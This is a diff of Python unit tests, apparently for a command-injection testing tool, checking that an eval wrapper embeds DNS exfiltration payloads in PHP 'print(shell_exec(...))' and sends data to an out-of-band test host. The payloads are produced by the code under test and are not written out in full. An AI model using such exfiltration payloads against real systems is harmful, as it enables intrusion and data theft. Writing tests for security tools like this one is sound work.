@@ -16,6 +16,7 @@ For more see the file 'readme/COPYING' for copying permission.
 import binascii
 import os
 import sys
+import re
 import unittest
 import unittest.mock as mock
 
@@ -539,6 +540,18 @@ class TestHeuristicPayload(unittest.TestCase):
 # OOB_EVAL: exfiltrate_eval and injection() with OOB_EVAL=True
 # ---------------------------------------------------------------------------
 
+"""
+What the eval wrapper's literal holds, as the shell will see it.
+
+The command is carried as a single-quoted string of the language being evaluated rather than
+written into one the interpreter reads, so a '$' or a backtick of the pipeline's own reaches the
+shell instead of being read by the interpreter on the way. Unescaped here the way that language
+unescapes it.
+"""
+def _eval_inner(payload):
+    literal = re.search(r"shell_exec\('(.*)'\)\)", payload).group(1)
+    return re.sub(r"\\(['\\])", r"\1", literal)
+
 class TestOobEval(unittest.TestCase):
 
     _HOST = "aabbccddeeaabbccddeetest0000token.oast.fun"
@@ -556,10 +569,10 @@ class TestOobEval(unittest.TestCase):
         result = payloads.exfiltrate_eval(";", "dns", self._HOST, "echo hello")
         self.assertTrue(result, "exfiltrate_eval returned empty for dns transport")
 
-    def test_wraps_in_eval_grammar_backticks(self):
-        # Default eval grammar is PHP: print(`...`);
+    def test_wraps_the_command_in_the_grammars_own_run(self):
+        # Default eval grammar is PHP: print(shell_exec('...'));
         result = payloads.exfiltrate_eval(";", "dns", self._HOST, "echo hello")
-        self.assertIn("`", result)
+        self.assertIn("shell_exec(", result)
         self.assertTrue(result.strip().startswith("print("))
 
     def test_contains_dns_pipeline_structure(self):
@@ -568,11 +581,12 @@ class TestOobEval(unittest.TestCase):
         self.assertIn("od -An", result)
 
     def test_inner_command_matches_plain_exfiltrate(self):
-        # The backtick content must be exactly what exfiltrate("", ...) builds.
+        # What the literal holds must be exactly what exfiltrate("", ...) builds - the pipeline
+        # carries '$0' and '$H' of its own, which a string the interpreter reads would have taken
+        # for its own variables and dropped.
         plain = payloads.exfiltrate("", "dns", self._HOST, "echo hello")
         wrapped = payloads.exfiltrate_eval(";", "dns", self._HOST, "echo hello")
-        inner = wrapped.split("`")[1]
-        self.assertEqual(inner, plain)
+        self.assertEqual(_eval_inner(wrapped), plain)
 
     def test_terminator_appended_when_separator_given(self):
         result = payloads.exfiltrate_eval(";", "dns", self._HOST, "echo hello")
